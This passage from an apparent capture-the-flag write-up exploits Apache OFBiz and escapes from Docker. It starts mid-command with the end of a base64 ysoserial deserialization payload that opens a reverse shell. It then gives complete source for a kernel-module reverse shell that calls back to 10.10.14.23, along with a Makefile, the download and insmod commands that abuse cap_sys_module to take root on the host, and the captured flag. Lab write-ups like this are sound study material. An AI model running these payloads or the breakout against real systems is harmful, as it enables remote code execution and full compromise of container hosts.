pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASYmFzaCAvdG1wL3NoZWxsLnNoCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMTE0MDA0NzgxMDI3NjQzAQAgTHlzb3NlcmlhbC9Qd25lcjExNDAwNDc4MTAyNzY0MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```

If we check our netcat listener we got Reverse Connection.

```
⛩\> nc -lvnp 8001
listening on [any] 8001 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.143.189] 60006
bash: cannot set terminal process group (30): Inappropriate ioctl for device
bash: no job control in this shell
root@14320b94cf2a:/usr/src/apache-ofbiz-17.12.01# id
id
uid=0(root) gid=0(root) groups=0(root)

root@14320b94cf2a:/usr/src/apache-ofbiz-17.12.01# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

As we know this is docker environment. Need to escape to gain root of host. Docker version is up-to-date. No vulnerability exists on this version.

```
marcus@monitors:~$ docker version
Client: Docker Engine - Community
 Version:           20.10.6
 API version:       1.41
 Go version:        go1.13.15
 Git commit:        370c289
 Built:             Fri Apr  9 22:46:01 2021
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
```

We need to find Docker Linux Container Capabilities. The ‘capsh’ command will help us to get information on current capabilities of this container linux.

[Linux Capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)

```
root@14320b94cf2a:~# capsh --print
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

We can take advantage of ‘Abusing cap_sys_module’ - This means that you can insert/remove kernel modules in/from the kernel of the host machine.

Create the kernel module that is going to execute a reverse shell and the Makefile to compile it.

[Abusing SYS_MODULE capability to perform Docker container breakout](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd)

Content of Reverse Shell in C, it has a bash one-liner to get reverse shell.

```
⛩\> cat reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.23/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Content of Make File

```
⛩\> cat Makefile
obj-m +=reverse-shell.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

**Note: Space before make has tabs not spaces.

Now we need to download these two files to docker container from our Kali Linux.

```
⛩\> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

To keep it clean, I will download these files in a specific directory.

```
root@14320b94cf2a:~# mkdir lab
mkdir lab
root@14320b94cf2a:~# cd lab
cd lab
root@14320b94cf2a:~/lab# wget 10.10.14.23/reverse-shell.c -O reverse-shell.c
wget 10.10.14.23/reverse-shell.c -O reverse-shell.c
--2021-04-29 17:22:26--  http://10.10.14.23/reverse-shell.c
Connecting to 10.10.14.23:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 617 [text/x-csrc]
Saving to: 'reverse-shell.c'

     0K                                                       100% 40.7M=0s

2021-04-29 17:22:27 (40.7 MB/s) - 'reverse-shell.c' saved [617/617]

root@14320b94cf2a:~/lab# wget 10.10.14.23/Makefile -O Makefile
wget 10.10.14.23/Makefile -O Makefile
--2021-04-29 17:22:44--  http://10.10.14.23/Makefile
Connecting to 10.10.14.23:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 160 [application/octet-stream]
Saving to: 'Makefile'

     0K                                                       100% 24.4M=0s

2021-04-29 17:22:44 (24.4 MB/s) - 'Makefile' saved [160/160]

root@14320b94cf2a:~/lab# ls
ls
Makefile
reverse-shell.c
```

Now we need to build executable from source code using make command.

```
root@14320b94cf2a:~/lab# make
make
make -C /lib/modules/4.15.0-142-generic/build M=/root/lab modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
  CC [M]  /root/lab/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/lab/reverse-shell.mod.o
  LD [M]  /root/lab/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
```

Check compiled files.

```
root@14320b94cf2a:~/lab# ls
ls
Makefile
Module.symvers
modules.order
reverse-shell.c
reverse-shell.ko
reverse-shell.mod.c
reverse-shell.mod.o
reverse-shell.o
```

The idea here is to compile this kernel module (reverse-shell.ko) into the kernel of the Docker host machine. On insertion, it will use usermode helper to create a reverse connect process from the userspace of the Docker host machine.

Setup Netcat Listener on Kali Linux.

```
⛩\> nc -lvnp 4444
listening on [any] 4444 ...
```

Load the .ko module into kernel

```
root@14320b94cf2a:~/lab# insmod reverse-shell.ko
insmod reverse-shell.ko
```

```plaintext
If it gives the following error "gcc: error trying to exec 'cc1': execvp: No such file or directory", then follow below steps to mitigate.

export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/
make clean
make all
```

![root-optimized.gif.gif](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/549C3BAB-D997-444B-865B-1E9A7D34A9C5_2/root-optimized.gif.gif)

We got root of host machine, now read the root flag.

```
⛩\> nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.143.189] 35080
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@monitors:/# cat /root/root.txt
cat /root/root.txt
ec180acff6b8b8b16b9dcac1facab3fc
```

